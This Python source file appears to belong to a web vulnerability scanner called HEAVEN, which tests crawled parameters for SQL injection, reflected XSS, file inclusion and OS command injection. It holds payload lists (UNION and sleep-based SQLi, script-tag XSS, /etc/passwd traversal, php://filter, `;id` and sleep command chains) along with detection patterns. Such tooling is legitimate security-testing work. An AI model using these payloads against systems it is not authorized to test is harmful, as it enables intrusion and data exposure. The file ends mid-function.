"""
HEAVEN — First-pass Injection Discovery
Rapidly tests every input vector (GET params, POST fields, HTTP headers) from the
web crawler for the major injection classes — SQL injection, XSS, Local/Remote
File Inclusion (LFI/RFI), and OS command injection. Produces candidate findings
that are then promoted to safe_validator for confirmation and, for SQLi, to
sqlmap_runner for deep exploitation.

Coverage:
  * SQLi  — error-based, boolean-blind, UNION-based, time-based blind
  * XSS   — reflected (execution-aware, escaping-resistant FP filter)
  * LFI   — path traversal + php:// wrappers, content-leak confirmed (CWE-98)
  * RFI   — best-effort remote-fetch attempt detection (CWE-98)
  * CmdI  — output-based (`id`/echo) + time-based blind (CWE-78)

Four SQLi detection techniques:
  1. Error-based  — trigger DBMS error messages (fast, reliable when errors shown)
  2. Boolean-based — compare true/false condition responses (catches hidden SQLi)
  3. UNION-based  — exfiltrate a unique marker via `UNION SELECT` (proves data
     read-out; column count is swept and the check is reflection-resistant)
  4. Time-based blind — measure SLEEP()/WAITFOR DELAY response time differential
     (catches fully blind SQLi where neither errors nor data differences are visible)

Every output-based check (SQLi boolean/union, CmdI echo marker) strips the
reflected payload before matching, so a page that merely echoes input is never
mistaken for genuine execution.
"""

from __future__ import annotations

import asyncio
import difflib
import hashlib
import html
import re
import time
from typing import Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

try:
    import aiohttp
except ImportError:
    aiohttp = None  # type: ignore[assignment]

from heaven.utils.logger import get_logger

logger = get_logger("vulnscan.injection")

# ─────────────────────────────────────────────────────────────────
# Probe payloads
# ─────────────────────────────────────────────────────────────────

# SQLi error-based payloads — trigger DBMS error messages.
# NOTE ON COMMENTS: terminators use "-- " (double-dash + SPACE), never a bare
# "--". MySQL/MariaDB only treat "--" as a comment when it is followed by
# whitespace or a control char; a bare "--" is a parse error. DVWA (and most PHP
# apps) run MySQL, so a bare "--" left the injected quote dangling and produced
# an identical error for both the true and false probe — silently killing the
# boolean oracle. "-- " (and the "#" variants below) comment correctly on MySQL,
# MariaDB, Postgres, MSSQL and SQLite alike.
SQLI_ERROR_PROBES: list[tuple[str, str]] = [
    ("'", "generic_quote"),
    ("''", "double_quote"),
    ("1 OR 1=1-- ", "or_true"),
    ("1' OR '1'='1", "or_string"),
    ("1 AND 1=2-- ", "and_false"),
    ("1;SELECT 1-- ", "stacked"),
    ("\\", "backslash"),
    ("1' AND SLEEP(0)-- ", "sleep_zero"),
    ("1 WAITFOR DELAY '0:0:0'-- ", "waitfor_zero"),
]

# Boolean-based SQLi: (true_payload, false_payload, probe_name)
# True condition → same response as baseline; False condition → different response.
# See the comment-style note above: terminators are "-- " or "#", never bare "--".
# When True (default), a boolean-blind SQLi oracle must reproduce on a second
# independent round before it is reported. This is the primary defence against
# the boolean-SQLi false positives that reflective / non-deterministic pages
# produce. Operators who want maximum recall on a stable target can flip it off.
REQUIRE_BOOLEAN_REPRODUCTION: bool = True

SQLI_BOOL_PROBES: list[tuple[str, str, str]] = [
    ("1 AND 1=1-- ", "1 AND 1=2-- ", "and_bool_int"),
    ("1' AND '1'='1'-- ", "1' AND '1'='2'-- ", "and_bool_str"),
    ("1) AND (1=1)-- ", "1) AND (1=2)-- ", "and_bool_paren"),
    ("1 OR 1=1-- ", "1 OR 1=2-- ", "or_bool_int"),
    ("1' AND '1'='1'#", "1' AND '1'='2'#", "and_bool_str_hash"),
]

# Time-based blind SQLi: (payload, sleep_seconds, probe_name)
# We use short sleep (3s) to keep the scan reasonably fast.
_SLEEP = 3
SQLI_TIME_PROBES: list[tuple[str, int, str]] = [
    (f"1; WAITFOR DELAY '0:0:{_SLEEP}'-- ",    _SLEEP, "mssql_waitfor"),
    (f"1'; WAITFOR DELAY '0:0:{_SLEEP}'-- ",   _SLEEP, "mssql_waitfor_str"),
    (f"1 AND SLEEP({_SLEEP})-- ",              _SLEEP, "mysql_sleep"),
    (f"1' AND SLEEP({_SLEEP})-- ",             _SLEEP, "mysql_sleep_str"),
    (f"1) AND SLEEP({_SLEEP})-- ",             _SLEEP, "mysql_sleep_paren"),
    (f"1;SELECT pg_sleep({_SLEEP})-- ",        _SLEEP, "pgsql_pg_sleep"),
    (f"1';SELECT pg_sleep({_SLEEP})-- ",       _SLEEP, "pgsql_pg_sleep_str"),
    (f"1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99),{_SLEEP})-- ", _SLEEP, "oracle_dbms_pipe"),
    (f"1 RLIKE SLEEP({_SLEEP})-- ",            _SLEEP, "mysql_rlike_sleep"),
]

# Time differential threshold: response must be >= (sleep - 0.5) seconds
_TIME_THRESHOLD_FACTOR = 0.85

# UNION-based SQLi: a unique marker exfiltrated through `UNION SELECT`. Detection
# is high-confidence (the marker only appears if our injected SELECT executed and
# a column was rendered) and reflection-resistant (see _test_sqli_union_param).
_UNION_MARK = "h3av3nun10n"
SQLI_UNION_MAX_COLS = 6

# DB error signatures (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
SQLI_ERROR_PATTERNS: list[re.Pattern] = [
    re.compile(p, re.IGNORECASE) for p in [
        r"you have an error in your sql syntax",
        r"warning.*mysql_",
        r"unclosed quotation mark",
        r"quoted string not properly terminated",
        r"pg_query\(\).*failed",
        r"psql.*error",
        r"ora-\d{5}",
        r"microsoft.*odbc.*sql server",
        r"sql server.*error",
        r"sqlite.*exception",
        r"syntax error.*near",
        r"unterminated string",
        r"jdbc.*sql",
        r"com\.mysql\.jdbc",
        r"org\.postgresql",
        r"sqlexception",
    ]
]

# XSS reflection payloads — unique canary-based
_XSS_CANARY = "h3av3n"
XSS_PROBES: list[tuple[str, str]] = [
    (f'<script>alert("{_XSS_CANARY}")</script>', "script_tag"),
    (f'">{_XSS_CANARY}<img src=x onerror=1>', "break_attr"),
    (f"'>{_XSS_CANARY}<svg/onload=1>", "break_single"),
    (f"javascript:{_XSS_CANARY}", "js_uri"),
    (f"<{_XSS_CANARY}>", "bare_tag"),
    (f"&#x3C;{_XSS_CANARY}&#x3E;", "html_encoded"),
]


def _xss_is_executable(payload: str, body: str) -> bool:
    """True only when the XSS payload reflects in a form that can EXECUTE.

    The plain canary appearing in the body proves input reaches output, but a
    correctly-escaping app reflects `&lt;script&gt;...h3av3n...` — the canary is
    still present yet nothing executes. Flagging that is a false positive.
    A finding requires the payload's raw markup (intact `<`,`>`) to survive.
    """
    if _XSS_CANARY not in body:
        return False
    low = body.lower()
    # Dangerous fragments that, reflected verbatim (unescaped), can execute.
    markers = [
        f'<script>alert("{_XSS_CANARY}")'.lower(),
        f"<{_XSS_CANARY}>".lower(),
        "<img src=x onerror=",
        "<svg/onload=",
    ]
    return any(m in low for m in markers)


# ── Local/Remote File Inclusion (LFI/RFI) ──────────────────────────
# Path-traversal + wrapper payloads. Detection is content-based (the included
# file leaks into the response) so it's high-confidence, not heuristic.
LFI_PROBES: list[tuple[str, str]] = [
    ("/etc/passwd", "abs_passwd"),
    ("../../../../../../../../etc/passwd", "trav_passwd"),
    ("....//....//....//....//....//etc/passwd", "trav_passwd_bypass"),
    ("../../../../../../../../etc/passwd%00", "trav_passwd_null"),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "trav_win_ini"),
    ("php://filter/convert.base64-encode/resource=index.php", "php_filter_b64"),
]
LFI_PATTERNS: list[re.Pattern] = [
    re.compile(r"root:.*?:0:0:", re.I),                 # /etc/passwd line
    re.compile(r"daemon:.*?:/usr/sbin", re.I),          # /etc/passwd line
    re.compile(r"\[(extensions|fonts|mci|files)\]", re.I),  # win.ini sections
    re.compile(r"PD9waHA"),                              # base64("<?php") — php filter leak
]

# Remote File Inclusion — best-effort: a benign unroutable URL. If the app TRIES
# to fetch it (stream-open error naming our host, or include() echoing it) it is
# RFI-capable. Reported high/medium, lower confidence than LFI.
_RFI_HOST = "heaven-rfi-probe.invalid"
RFI_PROBES: list[tuple[str, str]] = [
    (f"http://{_RFI_HOST}/h3av3n.txt", "remote_http"),
]
RFI_PATTERNS: list[re.Pattern] = [
    re.compile(rf"failed to open stream:.*{re.escape(_RFI_HOST)}", re.I),
    re.compile(rf"(include|require)(_once)?\(\).*{re.escape(_RFI_HOST)}", re.I),
    re.compile(r"allow_url_(include|fopen)", re.I),
]

# ── OS Command Injection ───────────────────────────────────────────
# Output-based: shell metacharacters chaining `id`; we detect the uid=… output.
# Plus a deterministic echo-math marker for apps that swallow id's output.
_CMDI_MARK = "h3av3n7x7"
CMDI_PROBES: list[tuple[str, str]] = [
    (";id", "semicolon_id"),
    ("| id", "pipe_id"),
    ("&& id", "and_id"),
    ("`id`", "backtick_id"),
    ("$(id)", "subshell_id"),
    ("127.0.0.1;id", "ip_semicolon_id"),               # for ping-style endpoints (DVWA exec)
    (f"; echo {_CMDI_MARK}", "echo_marker"),
    (f"& echo {_CMDI_MARK}", "echo_marker_win"),
]
CMDI_PATTERNS: list[re.Pattern] = [
    re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+\(", re.I),  # `id` output
    re.compile(_CMDI_MARK),                              # echo marker reflected raw
]
# Time-based blind command injection: (payload, sleep_seconds, probe)
CMDI_TIME_PROBES: list[tuple[str, int, str]] = [
    (f"; sleep {_SLEEP}", _SLEEP, "semicolon_sleep"),
    (f"| sleep {_SLEEP}", _SLEEP, "pipe_sleep"),
    (f"& ping -n {_SLEEP + 1} 127.0.0.1", _SLEEP, "win_ping"),
]


def _inclusion_hit(body: str) -> Optional[str]:
    """Return the matched LFI pattern (proof the included file leaked), else None."""
    for pat in LFI_PATTERNS:
        if pat.search(body):
            return pat.pattern
    return None


# Headers worth injecting into for reflected XSS / header injection
INJECTABLE_HEADERS = ["Referer", "X-Forwarded-For", "User-Agent", "X-Original-URL"]

# Keep old name for callers that imported it
SQLI_PROBES = SQLI_ERROR_PROBES

# ─────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────

def _finding_key(target: str, vuln_type: str, param: str) -> str:
    return hashlib.sha256(f"{target}|{vuln_type}|{param}".encode()).hexdigest()[:16]


# ── Boolean-blind SQLi decision (pure — unit-tested in tests/) ──────
# Boolean-blind detection is precision-sensitive: any page whose length or
# content depends on the input value (search boxes that echo the query, file
# includes that name the missing file, login forms) can *look* like a boolean
# oracle. The classic false positive is a page that simply reflects the payload
# — `1) AND (1=1)--` vs `1) AND (1=2)--` then differ only by the reflected text,
# not by any SQL result. We neutralise that by stripping the reflected payload
# and requiring the TRUE/FALSE responses to differ by a meaningful *absolute*
# amount (page-size-independent) while TRUE still tracks the baseline.

def _collapse_ws(text: str) -> str:
    """Collapse runs of whitespace so incidental re-render noise (indentation,
    line endings) doesn't register as a content difference."""
    return " ".join(text.split())


def _strip_reflection(body: str, payload: str) -> str:
    """Remove reflections of the injected payload from a response body, so an
    echoing page can't masquerade as a boolean-condition difference.

    HTML entities are decoded first, because apps typically escape reflected
    input (`htmlspecialchars` turns ``'`` into ``&#039;``), which would otherwise
    hide the reflection from a verbatim match.
    """
    body = html.unescape(body)
    if payload and payload in body:
        body = body.replace(payload, "")
    return body


def _diff_char_count(a: str, b: str, cap: int = 4000) -> int:
    """Number of characters that differ between two bodies. 0 == identical;
    grows with the size of the real content change.

    The common prefix/suffix are trimmed first (O(n)) so the super-linear matcher
    only ever runs on the region that actually differs — this keeps it fast and
    bounded on large or highly repetitive pages, where a naive char-level
    ``SequenceMatcher`` over the whole body is pathologically slow.
    """
    if a == b:
        return 0
    n = min(len(a), len(b))
    i = 0
    while i < n and a[i] == b[i]:
        i += 1
    j = 0
    while j < n - i and a[-1 - j] == b[-1 - j]:
        j += 1
    ra = a[i: len(a) - j][:cap]
    rb = b[i: len(b) - j][:cap]
    sm = difflib.SequenceMatcher(None, ra, rb, autojunk=False)
    matched = sum(block.size for block in sm.get_matching_blocks())
    return max(len(ra), len(rb)) - matched


def _boolean_sqli_confirmed(
    baseline_body: str,
    body_true: str,
    body_false: str,
    true_payload: str,
    false_payload: str,
    min_delta: int = 12,
) -> bool:
    """True iff the TRUE/FALSE responses show a genuine boolean-blind SQLi oracle.

    A real oracle: the TRUE condition reproduces the baseline (the row is still
    returned) while the FALSE condition hides it — so, once any reflected payload
    is removed, TRUE and FALSE differ by the size of that row while TRUE stays
    close to the baseline. A reflective/echoing page collapses to near-identical
    TRUE and FALSE bodies after stripping and is rejected.
    """
    if not (baseline_body and body_true and body_false):
        return False
    # All three go through _strip_reflection (which also HTML-decodes) so the
    # comparison is consistent and reflected payloads are neutralised.
    base = _collapse_ws(_strip_reflection(baseline_body, ""))
    bt = _collapse_ws(_strip_reflection(body_true, true_payload))
    bf = _collapse_ws(_strip_reflection(body_false, false_payload))

    delta_tf = _diff_char_count(bt, bf)      # TRUE vs FALSE (reflection removed)
    delta_tb = _diff_char_count(bt, base)    # TRUE vs baseline

    # TRUE≈FALSE after stripping → the "difference" was reflection/noise, not a
    # SQL result. Require a real, sizable TRUE/FALSE divergence that is driven by
    # the FALSE branch (TRUE must stay markedly closer to the baseline).
    return delta_tf >= min_delta and delta_tf > delta_tb * 2


def _inject_param(url: str, param: str, payload: str) -> str:
    """Return a new URL with `param` replaced by `payload`."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def build_injection_targets(
    endpoints: list[dict],
    seed_urls: Optional[list[str]] = None,
) -> tuple[list[str], dict[str, list]]:
    """Turn crawler endpoints into (urls, forms_by_url) for the injection scanner.

    Each crawler endpoint carries ``input_vectors`` (form fields + URL params)
    discovered on a page. This converts that raw attack surface into concrete
    scan targets:

    * **GET params** for a given action are combined into a SINGLE URL that
      carries *every* param at once. Many apps only execute the vulnerable query
      when all form fields are present (DVWA's SQLi page needs both ``id`` AND
      ``Submit``); a single-param URL would never trigger the bug. The scanner
      then fuzzes each param in turn while holding the others, so every parameter
      — including the *right* one (``id``) rather than only the submit button —
      is exercised on the combined URL.
    * **POST fields** become ``{action: [form_dict]}`` entries. The scanner only
      tests a POST form whose action is also a scan target, so every action URL
      is appended to ``urls``.

    Pure and side-effect free so it can be unit-tested without a live crawl.
    Mirrors (and is the single source of truth for) the orchestrator's
    injection-discovery wiring.
    """
    urls: list[str] = list(seed_urls or [])
    forms_by_url: dict[str, list] = {}
    get_params: dict[str, set] = {}

    def _add_post_field(action: str, param: str) -> None:
        forms_by_url.setdefault(action, [])
        form = next((f for f in forms_by_url[action] if f.get("action") == action), None)
        if form is None:
            form = {"action": action, "method": "POST", "fields": []}
            forms_by_url[action].append(form)
        if not any(fl.get("name") == param for fl in form["fields"]):
            form["fields"].append({"name": param, "value": "test"})

    for ep in endpoints:
        if not isinstance(ep, dict):
            continue
        ep_url = ep.get("url", "")
        if ep_url and ep_url not in urls:
            urls.append(ep_url)
        for iv in ep.get("input_vectors", []):
            if not isinstance(iv, dict):
                continue
            param = iv.get("param")
            iv_url = iv.get("url") or ep_url
            if not param or not iv_url:
                continue
            iv_url = iv_url.split("#", 1)[0]  # form action="#" → page URL
            if (iv.get("method") or "GET").upper() == "POST":
                _add_post_field(iv_url, param)
            else:
                get_params.setdefault(iv_url, set()).add(param)

    # Build ONE GET URL per action carrying all of its params (see docstring).
    for base_url, params in get_params.items():
        parsed = urlparse(base_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for p in params:
            qs.setdefault(p, ["1"])
        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        if test_url not in urls:
            urls.append(test_url)

    # Every POST form action must also be a scan target.
    for action in forms_by_url:
        if action not in urls:
            urls.append(action)

    return urls, forms_by_url


async def _get(session, url: str, headers: Optional[dict] = None, timeout: float = 8.0) -> tuple[int, str]:
    """Single GET, returns (status, body). Never raises."""
    try:
        async with session.get(
            url,
            headers=headers or {},
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=True,
            ssl=False,
        ) as resp:
            body = await resp.text(errors="replace")
            return resp.status, body
    except Exception:
        return 0, ""


async def _post(session, url: str, data: dict, headers: Optional[dict] = None,
                timeout: float = 8.0) -> tuple[int, str]:
    """Single POST, returns (status, body). Never raises."""
    try:
        async with session.post(
            url,
            data=data,
            headers=headers or {},
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=True,
            ssl=False,
        ) as resp:
            body = await resp.text(errors="replace")
            return resp.status, body
    except Exception:
        return 0, ""


# ─────────────────────────────────────────────────────────────────
# Core scanner
# ─────────────────────────────────────────────────────────────────

class InjectionScanner:
    """
    Rapid first-pass injection discovery.

    Takes input vectors produced by web_crawler and tests each parameter for
    SQLi and XSS.  All probes are lightweight and non-destructive; actual
    exploitation is delegated to safe_validator / sqlmap_runner.
    """

    def __init__(
        self,
        concurrency: int = 20,
        request_delay: float = 0.0,
        user_agent: str = "HEAVEN-Scanner/1.0",
    ) -> None:
        self._sem = asyncio.Semaphore(concurrency)
        self._delay = request_delay
        self._headers = {"User-Agent": user_agent}
        self._seen: set[str] = set()
        self._findings: list[dict] = []

    def _add_finding(self, **kwargs) -> None:
        key = _finding_key(
            kwargs.get("target", ""),
            kwargs.get("vuln_type", ""),
            kwargs.get("evidence", {}).get("param", ""),
        )
        if key in self._seen:
            return
        self._seen.add(key)
        self._findings.append(kwargs)

    # ── SQLi discovery ────────────────────────────────────────────

    async def _test_sqli_param(self, session, url: str, param: str,
                                baseline_body: str) -> None:
        # 1. Error-based
        for payload, probe_name in SQLI_ERROR_PROBES:
            injected_url = _inject_param(url, param, payload)
            async with self._sem:
                if self._delay:
                    await asyncio.sleep(self._delay)
                status, body = await _get(session, injected_url, self._headers)

            if not body:
                continue

            for pattern in SQLI_ERROR_PATTERNS:
                if pattern.search(body) and not pattern.search(baseline_body):
                    self._add_finding(
                        target=injected_url,
                        vuln_type="sqli",
                        title=f"SQL Injection (error-based) — param '{param}'",
                        severity="critical",
                        confidence=0.85,
                        evidence={
                            "param": param,
                            "payload": payload,
                            "probe": probe_name,
                            "error_pattern": pattern.pattern,
                            "url": url,
                        },
                        remediation="Use parameterised queries / prepared statements.",
                        cwe="CWE-89",
                    )
                    return  # one confirmed error per param is enough

    async def _test_sqli_boolean_param(self, session, url: str, param: str,
                                       baseline_body: str) -> None:
        """Boolean-based blind SQLi: true condition should match baseline; false should differ."""
        for true_pl, false_pl, probe_name in SQLI_BOOL_PROBES:
            url_true = _inject_param(url, param, true_pl)
            url_false = _inject_param(url, param, false_pl)
            async with self._sem:
                _, body_true = await _get(session, url_true, self._headers)
            async with self._sem:
                _, body_false = await _get(session, url_false, self._headers)

            if not body_true or not body_false:
                continue

            # Reflection-resistant oracle check (see _boolean_sqli_confirmed):
            # a page that merely echoes the payload is NOT a boolean-blind SQLi.
            if not _boolean_sqli_confirmed(baseline_body, body_true, body_false,
                                           true_pl, false_pl):
                continue

            # Co-confirmation: a real boolean-blind oracle is deterministic, so it
            # must reproduce on a second independent round. A dynamic page that
            # differed once by chance will not — this is the fix for the
            # boolean-SQLi false positives seen live against reflective DVWA
            # endpoints (xss_r / fi / brute).
            reproduced = True
            if REQUIRE_BOOLEAN_REPRODUCTION:
                async with self._sem:
                    _, body_true2 = await _get(session, url_true, self._headers)
                async with self._sem:
                    _, body_false2 = await _get(session, url_false, self._headers)
                reproduced = bool(body_true2 and body_false2 and _boolean_sqli_confirmed(
                    baseline_body, body_true2, body_false2, true_pl, false_pl))
            if not reproduced:
                continue  # did not reproduce → treat as noise, try next probe

            self._add_finding(
                target=url_true,
                vuln_type="sqli",
                title=f"SQL Injection (boolean-based blind) — param '{param}'",
                severity="critical",
                confidence=0.80,
                evidence={
                    "param": param,
                    "probe": probe_name,
                    "technique": "boolean_blind",
                    "true_payload": true_pl,
                    "false_payload": false_pl,
                    "baseline_len": len(baseline_body),
                    "true_len": len(body_true),
                    "false_len": len(body_false),
                    "reproduced": True,
                    "signals": ["boolean_oracle_confirmed", "boolean_oracle_reproduced"],
                    "proof": (f"boolean oracle held on two independent rounds "
                              f"(param '{param}', probe {probe_name})"),
                    "url": url,
                },
                remediation="Use parameterised queries / prepared statements.",
                cwe="CWE-89",
            )
            return

    async def _test_sqli_union_param(self, session, url: str, param: str,
                                     baseline_body: str) -> None:
        """UNION-based SQLi: exfiltrate a unique marker via ``UNION SELECT``.

        The column count is unknown, so we sweep 1..N and try both a
        string-quote-close and a numeric context; the marker is placed in every
        selected column so any displayed column leaks it. Reflection-resistant:
        the marker lives inside the payload, so we strip the reflected payload
        before checking — the marker only counts when it surfaces as query
        OUTPUT (a rendered row), never as a verbatim echo of the input.
        """
        if _UNION_MARK in baseline_body:
            return  # marker already present — can't use it as a signal here
        for ncols in range(1, SQLI_UNION_MAX_COLS + 1):
            cols = ",".join([f"'{_UNION_MARK}'"] * ncols)
            for prefix in ("1' UNION SELECT ", "1 UNION SELECT "):
                payload = f"{prefix}{cols} -- "
                injected_url = _inject_param(url, param, payload)
                async with self._sem:
                    if self._delay:
                        await asyncio.sleep(self._delay)
                    _, body = await _get(session, injected_url, self._headers)
                if not body:
                    continue
                if _UNION_MARK in _strip_reflection(body, payload):
                    self._add_finding(
                        target=injected_url,
                        vuln_type="sqli",
                        title=f"SQL Injection (UNION-based) — param '{param}'",
                        severity="critical",
                        confidence=0.9,
                        evidence={
                            "param": param,
                            "payload": payload,
                            "technique": "union",
                            "columns": ncols,
                            "marker": _UNION_MARK,
                            "url": url,
                        },
                        remediation="Use parameterised queries / prepared statements.",
                        cwe="CWE-89",
                    )
                    return

    async def _test_sqli_time_param(self, session, url: str, param: str) -> None:
        """Time-based blind SQLi: inject SLEEP/WAITFOR and measure response time.

        A naturally slow endpoint must not be flagged — the injected delay is
        compared against a measured baseline, and every hit is reproduced once.
        """
        async def _timed(value: str, timeout: float) -> tuple[int, float]:
            t0 = time.monotonic()
            async with self._sem:
                status, _ = await _get(session, _inject_param(url, param, value),
                                       self._headers, timeout=timeout)
            return status, time.monotonic() - t0

        # Baseline = slower of two benign requests, so one slow sample
        # doesn't drag the bar down.
        _, b1 = await _timed("1", 15.0)
        _, b2 = await _timed("1", 15.0)
        baseline = max(b1, b2)

        for payload, sleep_secs, probe_name in SQLI_TIME_PROBES:
            timeout = float(sleep_secs + 8)
            margin = sleep_secs * _TIME_THRESHOLD_FACTOR  # required extra delay
            status, elapsed = await _timed(payload, timeout)

            if status != 0 and elapsed >= baseline + margin:
                # Reproduce — a transient slow response is not an injection.
                status2, elapsed2 = await _timed(payload, timeout)
                if status2 != 0 and elapsed2 >= baseline + margin:
                    self._add_finding(
                        target=_inject_param(url, param, payload),
                        vuln_type="sqli",
                        title=f"SQL Injection (time-based blind) — param '{param}'",
                        severity="critical",
                        confidence=0.88,
                        evidence={
                            "param": param,
                            "payload": payload,
                            "probe": probe_name,
                            "technique": "time_blind",
                            "baseline_sec": round(baseline, 2),
                            "elapsed_sec": round(elapsed, 2),
                            "reproduce_sec": round(elapsed2, 2),
                            "sleep_secs": sleep_secs,
                            "url": url,
                        },
                        remediation="Use parameterised queries / prepared statements.",
                        cwe="CWE-89",
                    )
                    return

    async def _test_sqli_post(self, session, url: str, param: str,
                               baseline_body: str, other_fields: dict) -> None:
        # 1. Error-based
        for payload, probe_name in SQLI_ERROR_PROBES:
            data = {**other_fields, param: payload}
            async with self._sem:
                if self._delay:
                    await asyncio.sleep(self._delay)
                status, body = await _post(session, url, data, self._headers)

            if not body:
                continue

            for pattern in SQLI_ERROR_PATTERNS:
                if pattern.search(body) and not pattern.search(baseline_body):
                    self._add_finding(
                        target=url,
                        vuln_type="sqli",
                        title=f"SQL Injection (POST, error-based) — param '{param}'",
                        severity="critical",
                        confidence=0.85,
                        evidence={
                            "param": param,
                            "payload": payload,
                            "probe": probe_name,
                            "method": "POST",
                            "error_pattern": pattern.pattern,
                        },
                        remediation="Use parameterised queries / prepared statements.",
                        cwe="CWE-89",
                    )
                    return

        # 2. Time-based blind (POST)
        for payload, sleep_secs, probe_name in SQLI_TIME_PROBES[:4]:
            data = {**other_fields, param: payload}
            timeout = float(sleep_secs + 6)
            t_start = time.monotonic()
            async with self._sem:
                status, body = await _post(session, url, data, self._headers, timeout=timeout)
            elapsed = time.monotonic() - t_start

            if elapsed >= sleep_secs * _TIME_THRESHOLD_FACTOR and status != 0:
                self._add_finding(
                    target=url,
                    vuln_type="sqli",
                    title=f"SQL Injection (POST, time-based blind) — param '{param}'",
                    severity="critical",
                    confidence=0.88,
                    evidence={
                        "param": param,
                        "payload": payload,
                        "probe": probe_name,
                        "technique": "time_blind",
                        "method": "POST",
                        "elapsed_sec": round(elapsed, 2),
                    },
                    remediation="Use parameterised queries / prepared statements.",
                    cwe="CWE-89",
                )
                return

    # ── XSS discovery ─────────────────────────────────────────────

    async def _test_xss_param(self, session, url: str, param: str) -> None:
        for payload, probe_name in XSS_PROBES:
            injected_url = _inject_param(url, param, payload)
            async with self._sem:
                if self._delay:
                    await asyncio.sleep(self._delay)
                status, body = await _get(session, injected_url, self._headers)

            if _xss_is_executable(payload, body):
                self._add_finding(
                    target=injected_url,
                    vuln_type="xss",
                    title=f"Reflected XSS — param '{param}'",
                    severity="high",
                    confidence=0.80,
                    evidence={
                        "param": param,
                        "payload": payload,
                        "probe": probe_name,
                        "url": url,
                        "reflected": True,
                    },
                    remediation="Encode all user-supplied output. Apply CSP.",
                    cwe="CWE-79",
                )
                return

    async def _test_xss_post(self, session, url: str, param: str,
                              other_fields: dict) -> None:
        for payload, probe_name in XSS_PROBES:
            data = {**other_fields, param: payload}
            async with self._sem:
                if self._delay:
                    await asyncio.sleep(self._delay)
                status, body = await _post(session, url, data, self._headers)

            if _xss_is_executable(payload, body):
                self._add_finding(
                    target=url,
                    vuln_type="xss",
                    title=f"Reflected XSS (POST) — param '{param}'",
                    severity="high",
                    confidence=0.80,
                    evidence={
                        "param": param,
                        "payload": payload,
                        "probe": probe_name,
                        "method": "POST",
                        "reflected": True,
                    },
                    remediation="Encode all user-supplied output. Apply CSP.",
                    cwe="CWE-79",
                )
                return

    # ── Header injection ──────────────────────────────────────────

    async def _test_header_injection(self, session, url: str) -> None:
        """Test injectable HTTP headers for XSS reflection."""
        for header_name in INJECTABLE_HEADERS:
            for payload, probe_name in XSS_PROBES[:2]:  # quick check only
                headers = {**self._headers, header_name: payload}
                async with self._sem:
                    status, body = await _get(session, url, headers=headers)

                if _XSS_CANARY in body:
                    self._add_finding(
                        target=url,
                        vuln_type="xss",
                        title=f"Reflected XSS via {header_name} header",
                        severity="high",
                        confidence=0.75,
                        evidence={
                            "header": header_name,
                            "payload": payload,
                            "probe": probe_name,
                        },
                        remediation="Do not reflect HTTP headers in responses unescaped.",
                        cwe="CWE-79",
                    )
                    break

    # ── Per-URL orchestration ─────────────────────────────────────

    # ── File Inclusion (LFI / RFI) ────────────────────────────────
    async def _test_inclusion_param(self, session, url: str, param: str,
                                    baseline_body: str, *, post: bool = False,
                                    other_fields: Optional[dict] = None) -> None:
        """LFI (included-file content leak) + RFI (remote-fetch attempt)."""
        async def _probe(payload: str) -> str:
            async with self._sem:
                if self._delay:
                    await asyncio.sleep(self._delay)
                if post:
                    _, body = await _post(session, url, {**(other_fields or {}), param: payload}, self._headers)
                else:
                    _, body = await _get(session, _inject_param(url, param, payload), self._headers)
            return body or ""

        for payload, probe in LFI_PROBES:
            body = await _probe(payload)
            hit = _inclusion_hit(body) if body else None
            if hit and not _inclusion_hit(baseline_body):
                self._add_finding(
                    target=url, vuln_type="lfi",
                    title=f"Local File Inclusion / Path Traversal — param '{param}'",
                    severity="critical", confidence=0.9,
                    evidence={"param": param, "payload": payload, "probe": probe,
                              "match": hit, "method": "POST" if post else "GET", "url": url},
                    remediation="Never pass user input to file/include calls; allow-list file IDs.",
                    cwe="CWE-98",
                )
                break  # one LFI per param is enough

        for payload, probe in RFI_PROBES:
            body = await _probe(payload)
            if not body:
                continue
            for pat in RFI_PATTERNS:
                if pat.search(body) and not pat.search(baseline_body):
                    self._add_finding(
                        target=url, vuln_type="rfi",
                        title=f"Remote File Inclusion (attempted remote fetch) — param '{param}'",
                        severity="high", confidence=0.6,
                        evidence={"param": param, "payload": payload, "probe": probe,
                                  "match": pat.pattern, "method": "POST" if post else "GET", "url": url},
                        remediation="Disable allow_url_include; never include user-supplied URLs.",
                        cwe="CWE-98",
                    )
                    return

    # ── OS Command Injection ──────────────────────────────────────
    async def _test_cmdi_param(self, session, url: str, param: str,
                               baseline_body: str, *, post: bool = False,
                               other_fields: Optional[dict] = None) -> None:
        """Command injection: output-based (`id`/echo marker) then time-based blind."""
        async def _probe(payload: str, timeout: float = 8.0) -> tuple[float, str]:
            t0 = time.monotonic()
            async with self._sem:
                if self._delay:
                    await asyncio.sleep(self._delay)
                if post:
                    _, body = await _post(session, url, {**(other_fields or {}), param: payload},
                                          self._headers, timeout=timeout)
                else:
                    _, body = await _get(session, _inject_param(url, param, payload),
                                         self._headers, timeout=timeout)
            return time.monotonic() - t0, body or ""

        # 1) Output-based — shell metacharacters chaining `id` / echo. Use a
        # generous timeout: command endpoints often run a slow command first
        # (e.g. DVWA's exec runs `ping -c 4 <ip>` before our `;id`), so an 8s
        # cap would truncate the response and miss the injected output.
        for payload, probe in CMDI_PROBES:
            _, body = await _probe(payload, timeout=20.0)
            if not body:
                continue
            # Reflection guard: an app that merely echoes the payload back would
            # contain our echo marker (`h3av3n7x7`) inside the reflected payload
            # text — that is NOT command execution. Strip the reflected payload
            # first (HTML-entity-decoding, so escaped echoes are covered too), so
            # the marker/`uid=` only counts when it survives as real command
            # OUTPUT rather than as a verbatim echo of the input.
            probed = _strip_reflection(body, payload)
            for pat in CMDI_PATTERNS:
                if pat.search(probed) and not pat.search(baseline_body):
                    self._add_finding(
                        target=url, vuln_type="cmdi",
                        title=f"OS Command Injection — param '{param}'",
                        severity="critical", confidence=0.9,
